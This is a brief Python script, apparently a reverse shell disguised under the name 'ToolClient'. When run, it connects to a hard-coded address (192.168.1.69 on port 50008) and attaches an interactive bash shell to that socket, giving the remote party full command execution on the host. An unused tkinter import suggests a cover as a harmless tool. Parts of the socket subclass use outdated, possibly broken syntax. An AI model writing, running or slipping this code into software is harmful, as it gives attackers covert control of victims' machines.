from tkinter import *
from socket import *
import subprocess

class ToolClient:
    def __init__(self):
        s = MySocket()
        s.connect(('192.168.1.69', 50008))
        subprocess.Popen('bash', stdout=s, stdin=s, stderr=s).wait()


class MySocket(socket):
    def __init__(self, family=AF_INET, type=SOCK_STREAM, proto=0, _sock=None):
        socket.__init__(self, family=AF_INET, type=SOCK_STREAM, proto=0, _sock=None)

    def write(self, text):
        return self.send(text)

    def readlines(self):
        return self.recv(2048)

    def read(self):
        return self.recv(1024)


if __name__ == "__main__":
    tc = ToolClient()